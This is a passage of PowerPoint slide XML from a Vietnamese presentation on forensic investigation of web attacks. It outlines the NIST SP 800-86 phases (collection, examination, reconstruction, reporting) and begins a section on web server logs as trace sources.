              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> NIST SP 800-86, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>một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quy</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trình</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điều</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tra</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số</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chuẩn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hóa</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gồm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> 4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>giai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đoạn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cốt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lõi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>thập</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và</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Bảo</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quản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Collection &amp; Preservation): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Đảm</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bảo</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tính</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toàn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vẹn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của</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chứng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cứ</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bằng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cách</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sao</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lưu</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toàn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bộ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> log </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>hệ</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thống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ảnh</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bộ</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nhớ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (memory dumps) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>và</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sử</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dụng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thuật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toán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băm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (MD5/SHA-256) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>để</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chứng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minh</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dữ</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liệu</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không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bị</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thay</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đổi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pP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Sàng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lọc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và</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Phân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tích</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Examination &amp; Analysis): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Sử</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dụng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các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công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cụ</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kỹ</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thuật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để</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lọc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nhiễu</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tìm</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kiếm</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các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dấu</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hiệu</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bất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thường</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Anomalies) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>hoặc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các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mẫu</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nhận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diện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tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Attack Signatures).</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Dựng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lại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kịch</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bản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Reconstruction): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Kết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hợp</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các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mốc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thời</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gian</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Timeline Analysis) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>từ</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nhiều</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nguồn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dữ</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liệu</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khác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nhau</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để</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tìm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> ra: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Điểm</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xâm</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nhập</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> ban </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>đầu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Initial Access), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>hành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> vi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>leo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> thang </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>đặc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quyền</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và</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hành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> vi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>lấy</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cắp</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dữ</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liệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Data Exfiltration).</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Báo</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cáo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> (Reporting): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Trình</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bày</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kết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quả</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điều</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tra</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một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cách</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> khoa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>học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rõ</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ràng</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nhằm</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phục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vụ</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mục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đích</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kỹ</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thuật</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hoặc</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pháp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>lý</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="209" name="Google Shape;209;p22"/>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IV. Cơ sở lý thuyết:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="210" name="Google Shape;210;p22"/>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11" name="Google Shape;211;p22" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="1700212"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="212" name="Google Shape;212;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="4961900"/>
            <a:ext cx="90954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2100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Nguồn dấu vết trong điều tra tấn công Web:</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="213" name="Google Shape;213;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="5494700"/>
            <a:ext cx="7180800" cy="900246"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Web Server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>s (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Nhật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ký</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>chủ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Web):</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
